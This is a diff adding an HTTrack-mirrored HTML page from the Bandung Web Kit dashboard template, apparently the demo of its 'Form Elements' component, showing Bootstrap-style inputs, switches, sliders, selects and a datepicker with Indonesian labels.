@@ -1,0 +1,1116 @@
+<!DOCTYPE html>
+<html lang="en" class="">
+
+<!-- Mirrored from bdgwebkit.com/dashboard-components/form_element.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 13 Apr 2016 08:48:09 GMT -->
+<head>
+  <meta charset="utf-8" />
+  <title>Bandung Web Kit | BDGWEBKIT</title>
+  <meta name="description" content="Bandung Web Kit" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <link rel="stylesheet" href="../libs_dashboard/assets/animate.css/animate.css" type="text/css" />
+  <link rel="stylesheet" href="../libs_dashboard/assets/font-awesome/css/font-awesome.min.css" type="text/css" />
+  <link rel="stylesheet" href="../libs_dashboard/assets/simple-line-icons/css/simple-line-icons.html" type="text/css" />
+  <link rel="stylesheet" href="../libs_dashboard/jquery/bootstrap/dist/css/bootstrap.css" type="text/css" />
+
+  <link rel="stylesheet" href="css/font.css" type="text/css" />
+  <link rel="stylesheet" href="css/style.css" type="text/css" />
+  
+
+</head>
+<body>
+<div class="app app-header-fixed ">
+  
+
+    <!-- header -->
+  <header id="header" class="app-header navbar" role="menu">
+      <!-- navbar header -->
+      <div class="navbar-header bg-info">
+        <button class="pull-right visible-xs dk" ui-toggle-class="show" target=".navbar-collapse">
+          <i class="glyphicon glyphicon-cog"></i>
+        </button>
+        <button class="pull-right visible-xs" ui-toggle-class="off-screen" target=".app-aside" ui-scroll="app">
+          <i class="glyphicon glyphicon-align-justify"></i>
+        </button>
+        <!-- brand -->
+        <a href="#/" class="navbar-brand text-lt">          
+          <img src="img/logo-small.png" alt="." class="small-logo hide">
+          <img src="img/logo.png" alt="." class="large-logo">
+        </a>
+        <!-- / brand -->
+      </div>
+      <!-- / navbar header -->
+
+      <!-- navbar collapse -->
+      <div class="collapse pos-rlt navbar-collapse bg-info">
+        <!-- buttons -->
+        <div class="nav navbar-nav hidden-xs">
+                  
+        </div>
+        <!-- / buttons -->
+
+        <!-- link and dropdown -->
+        <ul class="nav navbar-nav hidden-sm">
+          <li>
+            <a href="#">HOME</a>
+          </li>
+          <li class="dropdown">
+            <a href="#" data-toggle="dropdown" class="dropdown-toggle">
+              <i class="fa fa-fw fa-plus visible-xs-inline-block"></i>
+              <span>PAGES</span> <span class="caret"></span>
+            </a>
+            <ul class="dropdown-menu" role="menu">
+              
+              <li>
+                <a href="#">
+                  <span class="badge bg-danger pull-right">5</span>
+                  <span>Form Elements</span>
+                </a>
+              </li>
+
+              <li>
+                <a href="#">
+                  <span class="badge bg-info pull-right">15</span>
+                  <span>Form Validation</span>
+                </a>
+              </li>
+
+              <li>
+                <a href="#">
+                  <span>Form Wizard</span>
+                </a>
+              </li>
+              
+            </ul>
+          </li>
+           <li>
+            <a href="#">PROJECT</a>
+          </li>
+        </ul>
+        <!-- / link and dropdown -->
+
+        <!-- nabar right -->
+        <ul class="nav navbar-nav navbar-right">
+          <li class="dropdown">
+            <a href="#" data-toggle="dropdown" class="dropdown-toggle">
+              <i class="icon-bdg_alert text14"></i>
+              <span class="visible-xs-inline">Notifikasi</span>
+              <span class="badge badge-sm up bg-danger pull-right-xs">2</span>
+            </a>
+            <!-- dropdown -->
+            <div class="dropdown-menu w-xl animated fadeIn">
+              <div class="panel bg-white">
+                <div class="panel-heading b-light bg-light">
+                  <strong>Kamu Punya <span>2</span> Notifikasi</strong>
+                </div>
+                <div class="list-group">
+                  <a href class="list-group-item">
+                    <span class="pull-left m-r thumb-sm">
+                      <img src="img/01.jpg" alt="..." class="img-circle">
+                    </span>
+                    <span class="clear block m-b-none">
+                      Pembangunan Taman daerah Bandung Barat<br>
+                      <small class="text-muted">10 minutes ago</small>
+                    </span>
+                  </a>
+                  <a href class="list-group-item">
+                    <span class="clear block m-b-none">
+                      Revitalisasi Sungai Cikapundung<br>
+                      <small class="text-muted">1 hour ago</small>
+                    </span>
+                  </a>
+                </div>
+                <div class="panel-footer text-sm">
+                  <a href class="pull-right"><i class="icon-bdg_setting3"></i></a>
+                  <a href="#notes" data-toggle="class:show animated fadeInRight">Lihat Semua Notifikasi</a>
+                </div>
+              </div>
+            </div>
+            <!-- / dropdown -->
+          </li>
+          <li class="dropdown">
+            <a href="#" data-toggle="dropdown" class="dropdown-toggle">
+              <i class="icon-bdg_search text14"></i>              
+            </a>
+            <!-- dropdown -->
+             <div class="search_wrapper pull-right w-xl animated fadeIn">
+              <form action="#">
+                <i class="pull-left glyphicon glyphicon-search"></i>
+                  <input type="text" class="pull-left" placeholder="Type Here">
+                <a href="#" class="remove-search"><i class="pull-right icon-bdg_cross"></i></a>
+              </form>
+            </div>
+            <!-- / dropdown -->
+          </li>
+          <li class="dropdown">
+            <a href="#" data-toggle="dropdown" class="bg-blue profile-header dropdown-toggle clear" data-toggle="dropdown">
+              <span class="thumb-sm avatar pull-left m-t-n-sm m-b-n-sm m-r-sm">
+                <img src="img/01.jpg" alt="...">                
+              </span>
+              <span class="hidden-sm hidden-md m-r-xl">Ridwan Kamil</span> <i class="text14 icon-bdg_setting3 pull-right"></i>
+            </a>
+            <!-- dropdown -->
+            <ul class="dropdown-menu animated fadeIn w-ml">             
+              <li>
+                <a href>
+                  <span class="badge bg-danger pull-right">30%</span>
+                  <span>Settings</span>
+                </a>
+              </li>
+              <li>
+                <a href>Profile</a>
+              </li>
+              <li>
+                <a href>
+                  <span class="label bg-info pull-right">new</span>
+                  Help
+                </a>
+              </li>
+              <li class="divider"></li>
+              <li>
+                <a>Logout</a>
+              </li>
+            </ul>
+            <!-- / dropdown -->
+          </li>
+        </ul>
+        <!-- / navbar right -->
+      </div>
+      <!-- / navbar collapse -->
+  </header>
+  <!-- / header -->
+
+
+    <!-- aside -->
+  <aside id="aside" class="app-aside hidden-xs bg-dark">
+      <div class="aside-wrap">
+        <div class="navi-wrap">
+          <!-- user -->
+          <div class="clearfix hidden-xs text-center hide" id="aside-user">
+            <div class="dropdown wrapper">
+              <a href="app.page.html">
+                <span class="thumb-lg w-auto-folded avatar m-t-sm">
+                  <img src="img/01.jpg" class="img-full" alt="...">
+                </span>
+              </a>
+              <a href="#" data-toggle="dropdown" class="dropdown-toggle hidden-folded">
+                <span class="clear">
+                  <span class="block m-t-sm">
+                    <strong class="font-bold text-lt">John.Smith</strong> 
+                    <b class="caret"></b>
+                  </span>
+                  <span class="text-muted text-xs block">Art Director</span>
+                </span>
+              </a>
+              <!-- dropdown -->
+              <ul class="dropdown-menu animated fadeInRight w hidden-folded">
+                <li class="wrapper b-b m-b-sm bg-info m-t-n-xs">
+                  <span class="arrow top hidden-folded arrow-info"></span>
+                  <div>
+                    <p>300mb of 500mb used</p>
+                  </div>
+                  <div class="progress progress-xs m-b-none dker">
+                    <div class="progress-bar bg-white" data-toggle="tooltip" data-original-title="50%" style="width: 50%"></div>
+                  </div>
+                </li>
+                <li>
+                  <a href>Settings</a>
+                </li>
+                <li>
+                  <a href="page_profile.html">Profile</a>
+                </li>
+                <li>
+                  <a href>
+                    <span class="badge bg-danger pull-right">3</span>
+                    Notifications
+                  </a>
+                </li>
+                <li class="divider"></li>
+                <li>
+                  <a href="page_signin.html">Logout</a>
+                </li>
+              </ul>
+              <!-- / dropdown -->
+            </div>
+            <div class="line dk hidden-folded"></div>
+          </div>
+          <!-- / user -->
+
+         <!-- nav -->
+          <nav ui-nav class="navi clearfix">
+            <ul class="nav">
+              <li class="hidden-folded m-t text-dark-grey text-xs padder-md padder-v-sm">
+                <span>Navigation</span>
+              </li>
+              <li>
+                <a href="index-2.html" class="text-dark-grey" >      
+                  <i class="icon-bdg_dashboard icon-grey"></i>
+                  <span class="font-bold">Dashboard</span>
+                </a>               
+              </li>
+              
+              <li class="line1 dg"></li>
+
+              <li class="hidden-folded text-dark-grey text-xs padder-md padder-v-sm">
+                <span>Components</span>
+              </li>
+              
+              <li>
+                <a href class="auto">
+                  <span class="pull-right text-muted">
+                    <i class="text8 icon-bdg_arrow3 text"></i>
+                    <i class="text8 icon-bdg_arrow1 text-active"></i>
+                  </span>
+                  <i class="icon-bdg_uikit"></i>
+                  <span class="font-bold">UI Kits</span>
+                </a>
+                <ul class="nav nav-sub dk">
+                  <li class="nav-sub-header">
+                    <a href>
+                      <span>UI Kits</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="ui_button.html">
+                      <span>Buttons</span>
+                    </a>
+                  </li>
+                  <li >
+                    <a href="ui_icons.html">
+                      <b class="badge bg-danger pull-right">3</b>
+                      <span>Icons</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="ui_grid.html">
+                      <span>Grid</span>
+                    </a>
+                  </li>
+                  
+                 
+                </ul>
+              </li>
+              <li>
+                <a href="table_static.html" class="auto">
+                  
+                  <b class="badge bg-info pull-right">2</b>
+                  <i class="icon-bdg_table"></i>
+                  <span class="font-bold">Table</span>
+                </a>
+               
+              </li>
+              <li class="active">
+                  <a href="form_element.html" class="auto">                  
+                  <i class="icon-bdg_form"></i>
+                  <span class="font-bold">Form</span>
+                </a>                
+              </li>
+              <li>
+                <a href="ui_chart.html">
+                  <i class="icon-bdg_chart2"></i>
+                  <span class="font-bold">Chart</span>
+                </a>
+              </li>
+              <li>
+                <a href class="auto">
+                  <span class="pull-right text-muted">
+                    <i class="text8 icon-bdg_arrow3 text"></i>
+                    <i class="text8 icon-bdg_arrow1 text-active"></i>
+                  </span>
+                  <i class="icon-bdg_layout"></i>
+                  <span class="font-bold">Pages</span>
+                </a>
+                <ul class="nav nav-sub dk">
+                  <li class="nav-sub-header">
+                    <a href>
+                      <span>Pages</span>
+                    </a>
+                  </li>
+    
+                 
+                  <li>
+                    <a href="lockscreen.html">
+                      <span>Lock screen</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="signin.html">
+                      <span>Signin</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="register.html">
+                      <span>Signup</span>
+                    </a>
+                  </li>
+                  <li>
+                    <a href="forgot_password.html">
+                      <span>Forgot password</span>
+                    </a>
+                  </li>
+                 
+                </ul>
+              </li>
+             
+              
+            </ul>
+          </nav>
+          <!-- nav -->
+
+
+
+        </div>
+      </div>
+  </aside>
+  <!-- / aside -->
+
+<!-- content -->
+<div id="content" class="app-content" role="main">
+
+  <div class="hbox hbox-auto-xs hbox-auto-sm ng-scope">
+      <div class="col">
+
+          <div class="bg-light lter">    
+              <ul class="breadcrumb bg-grey-breadcrumb m-b-none">
+                <li><a href="#" class="btn no-shadow" ui-toggle-class="app-aside-folded" target=".app">
+                   <i class="icon-bdg_expand1 text"></i>
+                  <i class="icon-bdg_expand2 text-active"></i>
+                </a>   </li>
+                <li><a href>Home</a></li>
+                <li><i class="fa fa-angle-right"></i><a href>Form</a></li>
+                <li class="active"><i class="fa fa-angle-right"></i>Form Elements</li>
+              </ul>
+          </div>
+
+          <div class="bg-light lter b-b wrapper-md padder-md">
+            <h1 class="m-n font-bold h4 padder">Form Elements</h1>
+          </div>      
+      <!-- App-content-body -->  
+
+
+
+
+<div class="wrapper-lg bg-light" ng-controller="FormDemoCtrl">
+  <div class="row">
+    <div class="col-sm-6">
+      <div class="panel panel-default">
+        <div class="panel-heading font-bold">Basic form</div>
+        <div class="panel-body">
+          <form role="form">
+            <div class="form-group">
+              <label>Nama</label>
+              <input type="text" class="form-control" placeholder="Masukan Nama">
+            </div>
+            <div class="form-group">
+              <label>Alamat</label>
+              <input type="text" class="form-control" placeholder="Alamat">
+            </div>
+            <div class="form-group">
+              <label>Pesan</label>
+             <textarea class="form-control">
+               
+             </textarea>
+            </div>
+            <div class="checkbox m-b-lg">
+              <label class="checkbox-inline">
+                <input type="checkbox" checked><i></i> Beritahu lewat email
+              </label>
+            </div>
+            <button type="submit" class="btn btn-sm btn-success">Kirim</button>
+          </form>
+        </div>
+      </div>
+    </div>
+    <div class="col-sm-6">
+      <div class="panel panel-default">
+        <div class="panel-heading font-bold">Horizontal form</div>
+        <div class="panel-body">
+          <form class="bs-example form-horizontal">
+            <div class="form-group">
+              <label class="col-lg-2 control-label">Nama</label>
+              <div class="col-lg-10">
+                <input type="text" class="form-control" placeholder="Email">
+                <span class="help-block m-b-none">Isikan Nama Anda.</span>
+              </div>
+            </div>
+            <div class="form-group">
+              <label class="col-lg-2 control-label">Alamat</label>
+              <div class="col-lg-10">
+                <input type="text" class="form-control" placeholder="Password">
+                 <span class="help-block m-b-none">Isikan Alamat Lengkap.</span>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label class="col-lg-2 control-label">Pesan</label>
+              <div class="col-lg-10">
+                <textarea class="form-control m-b-sm"></textarea>
+                
+              </div>
+            </div>
+            <div class="form-group">
+              <div class="col-lg-offset-2 col-lg-10">
+                <div class="checkbox">
+                  <label class="checkbox-inline">
+                    <input type="checkbox" checked><i></i> Beritahu lewat email
+                  </label>
+                </div>
+              </div>
+            </div>
+            <div class="form-group">
+              <div class="col-lg-offset-2 col-lg-10">
+                <button type="submit" class="btn btn-sm btn-info">Sign in</button>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="panel panel-default">
+    <div class="panel-heading font-bold">
+      Form elements
+    </div>
+    <div class="panel-body">
+      <form class="form-horizontal" method="get">        
+        
+        <div class="form-group">
+          <label class="col-sm-2 control-label">With help</label>
+          <div class="col-sm-10">
+            <input type="text" class="form-control">
+            <span class="help-block m-b-none">A block of help text that breaks onto a new line and may extend beyond one line.</span>
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label" for="input-id-1">Label focus</label>
+          <div class="col-sm-10">
+            <input type="text" class="form-control" id="input-id-1">
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Password</label>
+          <div class="col-sm-10">
+            <input type="password" name="password" class="form-control">
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Placeholder</label>
+          <div class="col-sm-10">
+            <input type="text"  class="form-control" placeholder="placeholder">
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-lg-2 control-label">Disabled</label>
+          <div class="col-lg-10">
+            <input class="form-control" type="text" placeholder="Disabled input here..." disabled>
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-lg-2 control-label">Static control</label>
+          <div class="col-lg-10">
+            <p class="form-control-static">email@example.com</p>
+          </div>
+        </div>                    
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Checkboxes and radios</label>
+          <div class="col-sm-10">
+            <div class="checkbox">
+              <label>
+                <input type="checkbox" value="">
+                Option one is this and that&mdash;be sure to include why it's great
+              </label>
+            </div>
+
+            <div class="radio">
+              <label>
+                <input type="radio" name="optionsRadios" id="optionsRadios1" value="option1" checked>
+                Option one is this and that&mdash;be sure to include why it's great
+              </label>
+            </div>
+            <div class="radio">
+              <label>
+                <input type="radio" name="optionsRadios" id="optionsRadios2" value="option2">
+                Option two can be something else and selecting it will deselect option one
+              </label>
+            </div>
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Inline checkboxes</label>
+          <div class="col-sm-10">
+            <label class="checkbox-inline">
+              <input type="checkbox" value="option1"> a
+            </label>
+            <label class="checkbox-inline">
+              <input type="checkbox" value="option2"> b
+            </label>
+            <label class="checkbox-inline">
+              <input type="checkbox" value="option3"> c
+            </label>
+          </div>
+        </div>
+        
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Inline checkboxes</label>
+          <div class="col-sm-10">
+            <label class="checkbox-inline i-checks">
+              <input type="checkbox" value="option1"><i></i> a
+            </label>
+            <label class="checkbox-inline i-checks">
+              <input type="checkbox" value="option2"><i></i> b
+            </label>
+            <label class="checkbox-inline i-checks">
+              <input type="checkbox" value="option3"><i></i> c
+            </label>
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Switch</label>
+          <div class="col-sm-10">
+            <label class="i-switch m-t-xs m-r">
+              <input type="checkbox" checked>
+              <i></i>
+            </label>
+            <label class="i-switch bg-info m-t-xs m-r">
+              <input type="checkbox" checked>
+              <i></i>
+            </label>
+            <label class="i-switch bg-primary m-t-xs m-r">
+              <input type="checkbox" checked>
+              <i></i>
+            </label>
+            <label class="i-switch bg-danger m-t-xs m-r">
+              <input type="checkbox" checked>
+              <i></i>
+            </label>
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Radio Switch</label>
+          <div class="col-sm-10">
+            <label class="i-switch bg-primary m-t-xs m-r">
+              <input type="radio" name='switch' checked>
+              <i></i>
+            </label>
+            <label class="i-switch bg-warning m-t-xs m-r">
+              <input type="radio" name='switch'>
+              <i></i>
+            </label>
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Switch size</label>
+          <div class="col-sm-10">
+            <label class="i-switch i-switch-md bg-info m-t-xs m-r">
+              <input type="checkbox" checked>
+              <i></i>
+            </label>
+            <label class="i-switch i-switch-lg bg-dark m-t-xs m-r">
+              <input type="checkbox" >
+              <i></i>
+            </label>
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Select</label>
+          <div class="col-sm-10">
+            <select name="account" class="form-control m-b">
+              <option>option 1</option>
+              <option>option 2</option>
+              <option>option 3</option>
+              <option>option 4</option>
+            </select>
+            <div class="col-lg-4 m-l-n">
+              <select multiple class="form-control">
+                <option>option 1</option>
+                <option>option 2</option>
+                <option>option 3</option>
+                <option>option 4</option>
+              </select>
+            </div>
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group has-success">
+          <label class="col-sm-2 control-label">Input with success</label>
+          <div class="col-sm-10">
+            <input type="text" class="form-control">
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group has-warning">
+          <label class="col-sm-2 control-label">Input with warning</label>
+          <div class="col-sm-10">
+            <input type="text" class="form-control">
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group has-error">
+          <label class="col-sm-2 control-label">Input with error</label>
+          <div class="col-sm-10">
+            <input type="text" class="form-control">
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Control sizing</label>
+          <div class="col-sm-10">
+            <input class="form-control input-lg m-b" type="text" placeholder=".input-lg">
+            <input class="form-control m-b" type="text" placeholder="Default input">
+            <input class="form-control input-sm" type="text" placeholder=".input-sm">
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Column sizing</label>
+          <div class="col-sm-10">
+            <div class="row">
+              <div class="col-md-2">
+                <input type="text" class="form-control" placeholder=".col-md-2">
+              </div>
+              <div class="col-md-3">
+                <input type="text" class="form-control" placeholder=".col-md-3">
+              </div>
+              <div class="col-md-4">
+                <input type="text" class="form-control" placeholder=".col-md-4">
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Input groups</label>
+          <div class="col-sm-10">
+            <div class="input-group m-b">
+              <span class="input-group-addon">@</span>
+              <input type="text" class="form-control" placeholder="Username">
+            </div>
+            <div class="input-group m-b">
+              <input type="text" class="form-control">
+              <span class="input-group-addon">.00</span>
+            </div>
+            <div class="input-group m-b">
+              <span class="input-group-addon">$</span>
+              <input type="text" class="form-control">
+              <span class="input-group-addon">.00</span>
+            </div>
+            <div class="input-group m-b">
+              <span class="input-group-addon">
+                <input type="checkbox">
+              </span>
+              <input type="text" class="form-control">
+            </div>
+            <div class="input-group">
+              <span class="input-group-addon">
+                <input type="radio">
+              </span>
+              <input type="text" class="form-control">
+            </div>
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Button addons</label>
+          <div class="col-sm-10">
+            <div class="input-group m-b">
+              <span class="input-group-btn">
+                <button class="btn btn-default" type="button">Go!</button>
+              </span>
+              <input type="text" class="form-control">
+            </div>
+            <div class="input-group">
+              <input type="text" class="form-control">
+              <span class="input-group-btn">
+                <button class="btn btn-default" type="button">Go!</button>
+              </span>
+            </div>
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">With dropdowns</label>
+          <div class="col-sm-10">
+            <div class="input-group m-b">
+              <div class="input-group-btn dropdown" dropdown>
+                <button type="button" class="btn btn-default" dropdown-toggle>Action <span class="caret"></span></button>
+                <ul class="dropdown-menu">
+                  <li><a href>Action</a></li>
+                  <li><a href>Another action</a></li>
+                  <li><a href>Something else here</a></li>
+                  <li class="divider"></li>
+                  <li><a href>Separated link</a></li>
+                </ul>
+              </div><!-- /btn-group -->
+              <input type="text" class="form-control">
+            </div>
+            <div class="input-group">
+              <input type="text" class="form-control">
+              <div class="input-group-btn dropdown" dropdown>
+                <button type="button" class="btn btn-default" dropdown-toggle>Action <span class="caret"></span></button>
+                <ul class="dropdown-menu pull-right">
+                  <li><a href>Action</a></li>
+                  <li><a href>Another action</a></li>
+                  <li><a href>Something else here</a></li>
+                  <li class="divider"></li>
+                  <li><a href>Separated link</a></li>
+                </ul>
+              </div><!-- /btn-group -->
+            </div>
+          </div>
+        </div>
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Segmented</label>
+          <div class="col-sm-10">
+            <div class="input-group m-b">
+              <div class="input-group-btn dropdown" dropdown>
+                <button type="button" class="btn btn-default" tabindex="-1">Action</button>
+                <button type="button" class="btn btn-default" dropdown-toggle><span class="caret"></span></button>
+                <ul class="dropdown-menu">
+                  <li><a href>Action</a></li>
+                  <li><a href>Another action</a></li>
+                  <li><a href>Something else here</a></li>
+                  <li class="divider"></li>
+                  <li><a href>Separated link</a></li>
+                </ul>
+              </div><!-- /btn-group -->
+              <input type="text" class="form-control">
+            </div>
+            <div class="input-group">
+              <input type="text" class="form-control">
+              <div class="input-group-btn dropdown" dropdown>
+                <button type="button" class="btn btn-default" tabindex="-1">Action</button>
+                <button type="button" class="btn btn-default" dropdown-toggle><span class="caret"></span></button>
+                <ul class="dropdown-menu pull-right">
+                  <li><a href>Action</a></li>
+                  <li><a href>Another action</a></li>
+                  <li><a href>Something else here</a></li>
+                  <li class="divider"></li>
+                  <li><a href>Separated link</a></li>
+                </ul>
+              </div><!-- /btn-group -->
+            </div>
+          </div>
+        </div>
+        
+        
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Button radio</label>
+          <div class="col-sm-10">
+            <div class="btn-group">
+                <div class="btn-group btn-group-nav">
+                <button type="button" class="btn btn-default font-regular">Left</button>
+                <button type="button" class="btn btn-default font-regular active">Middle</button>
+                <button type="button" class="btn btn-default font-regular">Right</button>
+              </div> 
+            </div>
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Button checkbox</label>
+          <div class="col-sm-10">
+            <div class="btn-group">
+                <div class="btn-group btn-group-nav">
+                <button type="button" class="btn btn-default font-regular active">Left</button>
+                <button type="button" class="btn btn-default font-regular">Middle</button>
+                <button type="button" class="btn btn-default font-regular">Right</button>
+              </div> 
+            </div>
+          </div>          
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Slider</label>
+          <div class="col-sm-10">
+            <input id="slider" ui-jq="slider" ui-options="{
+              min: 0,
+              max: 20,
+              step: 1,
+              value: 5
+            }" class="slider slider-horizontal form-control" type="text"> <span class="m-l-sm font-bold">5</span>
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Vertical slider</label>
+          <div class="col-sm-10">
+            <input ui-jq="slider" class="slider slider-vertical form-control" type="text" value="" data-slider-min="5" data-slider-max="20" data-slider-step="1" data-slider-value="11" data-slider-orientation="vertical">
+            <input ui-jq="slider" class="slider slider-vertical form-control" type="text" value="" data-slider-min="5" data-slider-max="20" data-slider-step="1" data-slider-value="15" data-slider-orientation="vertical">
+            <input ui-jq="slider" class="slider slider-vertical form-control" type="text" value="" data-slider-min="5" data-slider-max="20" data-slider-step="1" data-slider-value="12" data-slider-orientation="vertical">
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Range selector</label>
+          <div class="col-sm-10">
+            <input type="text" ui-jq="slider" class="slider form-control" value="" data-slider-min="10" data-slider-max="1000" data-slider-step="5" data-slider-value="[250,750]" >
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Spinner</label>
+          <div class="col-sm-10">
+            <div class="m-b">
+              <input ui-jq="TouchSpin" type="text" value="0" class="form-control" data-min='0' data-max="10" data-step="0.1" data-decimals="2" data-prefix="$">
+            </div>
+            <div class="m-b">
+              <input ui-jq="TouchSpin" type="text" value="5" class="form-control" data-min='0' data-max="10" data-step="0.1" data-decimals="2" data-postfix="%">
+            </div>
+            <div>
+              <input ui-jq="TouchSpin" type="text" value="10" class="form-control" data-min='0' data-max="20" data-verticalbuttons="true" data-verticalupclass="fa fa-caret-up"  data-verticaldownclass="fa fa-caret-down">
+            </div>
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Chosen</label>
+          <div class="col-sm-10">
+            <select ui-jq="chosen" class="w-full">
+                <optgroup label="Alaskan/Hawaiian Time Zone">
+                    <option value="AK">Alaska</option>
+                    <option value="HI">Hawaii</option>
+                </optgroup>
+                <optgroup label="Pacific Time Zone">
+                    <option value="CA">California</option>
+                    <option value="NV">Nevada</option>
+                    <option value="OR">Oregon</option>
+                    <option value="WA">Washington</option>
+                </optgroup>
+                <optgroup label="Mountain Time Zone">
+                    <option value="AZ">Arizona</option>
+                    <option value="CO">Colorado</option>
+                    <option value="ID">Idaho</option>
+                    <option value="MT">Montana</option><option value="NE">Nebraska</option>
+                    <option value="NM">New Mexico</option>
+                    <option value="ND">North Dakota</option>
+                    <option value="UT">Utah</option>
+                    <option value="WY">Wyoming</option>
+                </optgroup>
+                <optgroup label="Central Time Zone">
+                    <option value="AL">Alabama</option>
+                    <option value="AR">Arkansas</option>
+                    <option value="IL">Illinois</option>
+                    <option value="IA">Iowa</option>
+                    <option value="KS">Kansas</option>
+                    <option value="KY">Kentucky</option>
+                    <option value="LA">Louisiana</option>
+                    <option value="MN">Minnesota</option>
+                    <option value="MS">Mississippi</option>
+                    <option value="MO">Missouri</option>
+                    <option value="OK">Oklahoma</option>
+                    <option value="SD">South Dakota</option>
+                    <option value="TX">Texas</option>
+                    <option value="TN">Tennessee</option>
+                    <option value="WI">Wisconsin</option>
+                </optgroup>
+                <optgroup label="Eastern Time Zone">
+                    <option value="CT">Connecticut</option>
+                    <option value="DE">Delaware</option>
+                    <option value="FL">Florida</option>
+                    <option value="GA">Georgia</option>
+                    <option value="IN">Indiana</option>
+                    <option value="ME">Maine</option>
+                    <option value="MD">Maryland</option>
+                    <option value="MA">Massachusetts</option>
+                    <option value="MI">Michigan</option>
+                    <option value="NH">New Hampshire</option><option value="NJ">New Jersey</option>
+                    <option value="NY">New York</option>
+                    <option value="NC">North Carolina</option>
+                    <option value="OH">Ohio</option>
+                    <option value="PA">Pennsylvania</option><option value="RI">Rhode Island</option><option value="SC">South Carolina</option>
+                    <option value="VT">Vermont</option><option value="VA">Virginia</option>
+                    <option value="WV">West Virginia</option>
+                </optgroup>
+            </select>
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Chosen multiple</label>
+          <div class="col-sm-10">
+            <select ui-jq="chosen" multiple class="w-md">
+              <option value="AK">Alaska</option>
+              <option value="HI">Hawaii</option>
+              <option value="CA">California</option>
+              <option value="NV">Nevada</option>
+              <option value="OR">Oregon</option>
+              <option value="WA">Washington</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Tags input</label>
+          <div class="col-sm-10">
+            <input ui-jq="tagsinput" ui-options="" class="form-control w-md" />
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
+        <div class="form-group">
+          <label class="col-sm-2 control-label">Datepicker</label>
+          <div class="col-sm-10" ng-controller="DatepickerDemoCtrl">
+            <div class="input-group w-md">
+              <input type="text" class="form-control" datepicker-popup="" ng-model="dt" is-open="opened" datepicker-options="dateOptions" ng-required="true" close-text="Close" />
+              <span class="input-group-btn">
+                <button type="button" class="btn btn-default" ng-click="open($event)"><i class="glyphicon glyphicon-calendar"></i></button>
+              </span>
+            </div>
+          </div>
+        </div>
+
+        <div class="line line-dashed b-b line-lg pull-in"></div>
